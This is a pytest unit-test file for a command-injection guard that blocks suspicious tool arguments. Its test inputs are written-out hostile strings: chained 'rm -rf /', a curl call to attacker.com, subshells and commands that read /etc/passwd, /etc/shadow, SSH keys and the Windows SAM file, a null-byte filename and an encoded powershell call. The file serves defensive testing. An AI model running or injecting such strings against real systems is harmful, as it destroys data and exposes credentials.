"""Unit tests for CommandInjectionGuard."""

import pytest
from proxy.guards.command_injection_guard import CommandInjectionGuard


def test_command_chaining_semicolon():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("data.csv; rm -rf /")
    assert res.is_blocked is True
    assert res.violation_code == "semicolon_command_chaining"


def test_command_chaining_and():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("file.txt && curl http://attacker.com")
    assert res.is_blocked is True
    assert res.violation_code == "logical_and_command_chaining"


def test_subshell_backticks():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("echo `id`")
    assert res.is_blocked is True
    assert res.violation_code == "backtick_subshell_injection"


def test_subshell_dollar():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("result=$(cat /etc/passwd)")
    assert res.is_blocked is True


def test_sensitive_system_files():
    guard = CommandInjectionGuard()
    res1 = guard.inspect_text("cat /etc/shadow")
    assert res1.is_blocked is True
    assert res1.violation_code == "sensitive_system_file_access"

    res2 = guard.inspect_text("load ~/.ssh/id_rsa")
    assert res2.is_blocked is True

    res3 = guard.inspect_text(r"copy C:\Windows\System32\config\SAM D:\backup")
    assert res3.is_blocked is True


def test_null_byte_injection():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("safe_filename.pdf%00.exe")
    assert res.is_blocked is True
    assert res.violation_code == "null_byte_injection"


def test_execution_wrapper():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("powershell.exe -enc dGVzdA==")
    assert res.is_blocked is True
    assert res.violation_code == "suspicious_execution_wrapper"


def test_recursive_arguments_inspection():
    guard = CommandInjectionGuard()
    args = {
        "action": "run_analysis",
        "nested": {
            "target": "normal_file.txt",
            "flags": ["--verbose", "; cat /etc/passwd"]
        }
    }
    res = guard.inspect_arguments(args)
    assert res.is_blocked is True


def test_benign_parameter():
    guard = CommandInjectionGuard()
    res = guard.inspect_text("quarterly_report_2026.docx")
    assert res.is_blocked is False
    assert res.violation_code is None
